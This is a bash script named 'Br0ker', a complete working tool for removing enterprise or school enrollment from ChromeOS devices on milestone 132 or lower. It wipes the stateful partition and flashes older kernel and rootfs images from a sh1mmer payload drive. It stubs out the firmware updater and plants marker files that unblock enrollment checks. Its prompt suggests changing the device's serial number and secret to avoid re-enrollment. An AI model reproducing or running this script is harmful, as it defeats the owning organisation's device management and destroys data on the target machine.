#!/bin/bash
# Br0ker: unenrollment for <=r132 (<=kernver 5 on most devices)
# Patched in https://crrev.com/c/6040974
# Made by OlyB :D Enjoy :D
SCRIPT_DIR=$(dirname "$0")
SCRIPT_DIR=${SCRIPT_DIR:-"."}

set -eE

SCRIPT_DATE="[2025-08-03]"
PAYLOAD_DIR=/mnt/sh1mmer/mounted_payloads
RECOVERY_KEY_LIST="$SCRIPT_DIR"/short_recovery_keys.txt

MNT=
TMPFILE=

fail() {
	printf "%b\n" "$*" >&2
	exit 1
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	command -v sfdisk >/dev/null 2>&1 || return 0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
				*'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

get_fixed_dst_drive() {
	local dev
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		for dev in /sys/block/sd* /sys/block/mmcblk*; do
			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
				continue
			fi
			if [ -f "${dev}/device/type" ]; then
				case "$(cat "${dev}/device/type")" in
				SD*)
					continue;
					;;
				esac
			fi
			DEFAULT_ROOTDEV="{$dev}"
		done
	fi
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		dev=""
	else
		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
		if [ ! -b "${dev}" ]; then
			dev=""
		fi
	fi
	echo "${dev}"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

cleanup() {
	[ -d "$MNT" ] && umount "$MNT" || :
	[ -f "$TMPFILE" ] && rm "$TMPFILE" || :
}

get_kernelver() {
	local tpmc_out
	if ! tpmc_out=$(tpmc read 0x1008 9); then
		# give up
		printf "0x1"
		return 0
	fi
	set -- $tpmc_out
	local struct_version=$(printf "%d" "0x$1")
	if [ $struct_version -lt 16 ]; then
		shift 1
	fi
	printf "0x%x" "$(( 0x$6 << 8 | 0x$5 ))"
}

trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
trap 'cleanup; exit' EXIT
trap 'echo Abort.; cleanup; exit' INT

BOARD=
if [ -f /etc/lsb-release ]; then
	BOARD=$(grep -m 1 "^CHROMEOS_RELEASE_BOARD=" /etc/lsb-release)
	BOARD="${BOARD#*=}"
	BOARD="${BOARD%-signed-*}"
else
	[ -f "$RECOVERY_KEY_LIST" ] || fail "Missing recovery key list!"
	TMPFILE=$(mktemp)
	flashrom -i GBB -r "$TMPFILE" >/dev/null 2>&1
	futility gbb -g --recoverykey="$TMPFILE".vbpubk "$TMPFILE" >/dev/null 2>&1
	recoverykeysum=$(futility show "$TMPFILE".vbpubk | grep "Key sha1sum" | sed "s/ *Key sha1sum: *//")
	BOARD=$(grep ";$recoverykeysum" "$RECOVERY_KEY_LIST" | cut -d";" -f1)
	BOARD="${BOARD#board:}"
	rm "$TMPFILE" "$TMPFILE".vbpubk
fi

CROS_DEV=$(get_largest_cros_blockdev)
if [ -z "$CROS_DEV" ] && [ -f /usr/sbin/write_gpt.sh ]; then
	. /usr/sbin/write_gpt.sh
	load_base_vars
	CROS_DEV=$(get_fixed_dst_drive)
fi
[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"

TARGET_STATEFUL=$(format_part_number "$CROS_DEV" 1)
TARGET_KERN=$(format_part_number "$CROS_DEV" 2)
TARGET_ROOT=$(format_part_number "$CROS_DEV" 3)
[ -b "$TARGET_STATEFUL" ] || fail "$TARGET_STATEFUL is not a block device!"
[ -b "$TARGET_KERN" ] || fail "$TARGET_KERN is not a block device!"
[ -b "$TARGET_ROOT" ] || fail "$TARGET_ROOT is not a block device!"

if [ -f /etc/init/trunksd.conf ]; then
	initctl stop trunksd >/dev/null 2>&1 || :
elif [ -f /etc/init/tcsd.conf ]; then
	initctl stop tcsd >/dev/null 2>&1 || :
fi

KERNELVER=$(get_kernelver)
if [ "$BOARD" = "ambassador" ]; then
	[ $((KERNELVER)) -le 3 ] || fail "Kernel version ($KERNELVER) is too high :("
else
	[ $((KERNELVER)) -le 5 ] || fail "Kernel version ($KERNELVER) is too high :("
fi

clear
echo "Welcome to Br0ker."
echo "Script date: ${SCRIPT_DATE}"
echo ""
echo "This will destroy all data on ${TARGET_STATEFUL} and unenroll the device."
echo "Additional steps may be needed to stay unenrolled:"
echo "- Downgrading to r124 or lower"
echo "- Changing the device's serial number"
echo "- Changing the device's secret"
echo "- Other temporary bypasses, check the \"Avoiding accidental re-enrollment\" thread in TN for more info."
echo "Continue? (y/N)"
read -r action
case "$action" in
	[yY]) : ;;
	*) fail "Abort." ;;
esac

MNT=$(mktemp -d)
USE_KERN=

for i in 3 5; do
	mount -o ro "$(format_part_number "$CROS_DEV" "$i")" "$MNT" >/dev/null 2>&1 || continue
	if [ -f "$MNT"/etc/lsb-release ] && version=$(grep -m 1 "^CHROMEOS_RELEASE_CHROME_MILESTONE=" "$MNT"/etc/lsb-release) && \
	[ ${version#*=} -le 132 ] && [ ${version#*=} -ge 106 ]; then
		USE_KERN=$((i - 1))
		TARGET_KERN=$(format_part_number "$CROS_DEV" "$USE_KERN")
		TARGET_ROOT=$(format_part_number "$CROS_DEV" "$i")
		echo "Using existing kernel: $TARGET_KERN"
		umount "$MNT"
		break
	fi
	umount "$MNT"
done

if [ -z "$USE_KERN" ]; then
	[ -d "$PAYLOAD_DIR" ] || fail "Missing mounted payload directory! Ensure the USB drive/SD card is still plugged in!"
	KERN_PAYLOAD="$PAYLOAD_DIR/updates/16093/$BOARD"/kern.gz
	ROOT_PAYLOAD="$PAYLOAD_DIR/updates/16093/$BOARD"/root.gz
	[ -f "$KERN_PAYLOAD" ] || fail "Required payload '$KERN_PAYLOAD' not found! Is this image built with the correct payload for Br0ker?"
	[ -f "$ROOT_PAYLOAD" ] || fail "Required payload '$ROOT_PAYLOAD' not found! Is this image built with the correct payload for Br0ker?"

	USE_KERN=2
	echo "DD kernel"
	pv "$KERN_PAYLOAD" | gzip -d | dd of="$TARGET_KERN" bs=16M
	echo "DD rootfs"
	pv "$ROOT_PAYLOAD" | gzip -d | dd of="$TARGET_ROOT" bs=16M

	echo "Running postinst"
	mount -o ro "$TARGET_ROOT" "$MNT"
	TMPFILE=$(mktemp)
	cat <<EOF >"$TMPFILE"
#!/bin/sh
EOF
	chmod +x "$TMPFILE"
	mount --bind "$TMPFILE" "$MNT"/usr/sbin/chromeos-firmwareupdate
	IS_RECOVERY_INSTALL=1 IS_INSTALL=1 "$MNT"/postinst "$TARGET_ROOT" || :
	echo ""
	umount "$MNT"/usr/sbin/chromeos-firmwareupdate
	umount "$MNT"
fi

cgpt add "$CROS_DEV" -i "$USE_KERN" -S1 -T0
cgpt prioritize "$CROS_DEV" -i "$USE_KERN"

echo "Setting up stateful"
if command -v mkfs.ext4 >/dev/null 2>&1; then
	mkfs.ext4 -F -b 4096 -L H-STATE "$TARGET_STATEFUL"
else
	mount -o ro "$TARGET_ROOT" "$MNT"
	mount --bind /dev "$MNT"/dev
	chroot "$MNT" /sbin/mkfs.ext4 -F -b 4096 -L H-STATE "$TARGET_STATEFUL"
	umount "$MNT"/dev
	umount "$MNT"
fi

mount "$TARGET_STATEFUL" "$MNT"
mkdir -p "$MNT"/dev_mode_unblock_broker
touch "$MNT"/dev_mode_unblock_broker/carrier_lock_unblocked \
"$MNT"/dev_mode_unblock_broker/init_state_determination_unblocked \
"$MNT"/dev_mode_unblock_broker/enrollment_unblocked

echo "Cleaning up"
cleanup

vpd -i RW_VPD -s check_enrollment=0 -s block_devmode=1 || : # block_devmode=1 required
crossystem disable_dev_request=1 || :
crossystem disable_dev_request=1 # grunt weirdness
crossystem block_devmode=1 || :
crossystem block_devmode=1

echo "Finished! Press enter to reboot."
read -rs
reboot -f
sleep infinity
